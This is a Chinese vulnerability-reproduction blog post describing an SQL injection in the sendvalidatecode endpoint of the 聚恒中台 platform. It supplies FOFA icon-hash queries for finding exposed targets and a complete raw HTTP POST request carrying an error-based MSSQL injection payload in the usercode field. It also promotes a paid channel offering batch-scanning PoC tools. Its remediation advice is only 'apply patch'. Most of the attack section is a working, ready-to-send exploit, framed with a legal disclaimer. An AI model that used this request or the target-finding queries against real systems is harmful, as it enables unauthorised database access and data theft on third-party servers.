#  聚恒中台sendvalidatecode接口存在SQL注入  附POC  
2026-10-11更新
                    2026-10-11更新  南风漏洞复现文库   2026-10-11 15:36  
  
   
  
#   
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. 聚恒中台简介  
  
微信公众号搜索：南风漏洞复现文库  
该文章 南风漏洞复现文库 公众号首发  
  
聚恒中台  
## 2.漏洞描述  
  
聚恒中台sendvalidatecode接口存在SQL注入  
  
CVE编号:  
  
CNNVD编号:  
  
CNVD编号:  
## 3.影响版本  
  
聚恒中台  
![聚恒中台sendvalidatecode接口存在SQL注入](https://mmbiz.qpic.cn/sz_mmbiz_png/b9KQYsB8q6yYDmJLCCUg6DibKbVHo7jtFh1n6SshnmTibstE3aKfFnmWSha0yCxfz9N410y25jwgZoZSz1mibmrxicA61qxDRTrNweGkePEn8XI/640?wx_fmt=png&from=appmsg "")  
  
聚恒中台sendvalidatecode接口存在SQL注入  
## 4.fofa查询语句  
  
icon_hash="-2049533275" || icon_hash="-737808640" || icon_hash="-1557056363"  
## 5.漏洞复现  
  
漏洞链接：http://xx.xx.xx.xx/sysplat/dataget/data.ashx?type=sendvalidatecode  
  
漏洞数据包：  
```
POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Host: xx.xx.xx.xx
Content-Length: 53
Content-Type: application/x-www-form-urlencoded

usercode=1' and 1=(convert(int,@@version))--&&mobile=
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zicUVHg3icbO4cM0mXhpp2gcLicTumzD17QATibR44gNFxt4Osz7bSsGFdBEOMicY1X4AWVAzeXFOKGiahKyAxGYm9mm2TEicvWq3O1A/640?wx_fmt=jpeg&from=appmsg "")  
## 6.POC&EXP  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全  
1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。  
2: 免登录，免费fofa查询。   
3: 更新其他实用网络安全工具项目。  
4: 免费指纹识别，持续更新指纹库。  
5: Nuclei脚本。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6wia5bR6X5Ih61bv98WO5ajLoDHRjvVOeWudJ6okpajXpIvXzahGliakI8DeicTM41LmciciaB8ZVElIgbXOzK4DcPFk6lJQSuU2MCY/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6yUQPrgqicp7FNaXn4gWyNA6jVWABqr5GJlKZyTLooiatYqlDJH7TuQqsjiczYpqiayv8or2PuzaHVFnxS8NZyu8JKxYgUYJPVmIDQ/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6ypbxmtpXvUztAcslbPOqmJ2pUcnJC5Ztloga4rhl1tXhGLdBlTBfjB9gmPoIkjvbVHosDjV80wucrt68QcEs96Libu2MBYeBE4/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6zYsGwiaU5HcQibnxibmu1JABw5ibJKTb5ljLuDgk6VLvrDwRLV1Hb9ht6179tpRgxCvpzNK62MEj6CkSmgaMvXHMzSmnuqjEvj7ro/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/b9KQYsB8q6wSeQsUDibMCCJ3rVkvTkcibRv6j6YdCibKlibnc8SAYCJ6ZaQ2wLKextWmHZQU8HyjZKqQK6yRDyKVJfe8UbpMjQOdkfk0d2EjjeY/640?wx_fmt=jpeg&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/b9KQYsB8q6yqtAdJAfJz0J9fKMyX8wdBVcmfD33bIiaKBOFSYjaKr4v4BGBOQaeURn4y5qvxkg7dMGUOlpLiaEVHADVcnFn5G4kxP2Vu0OKnE/640?wx_fmt=jpeg&from=appmsg "")  
## 7.整改意见  
  
打补丁  
## 8.往期回顾  
  
  
   
  
  
  
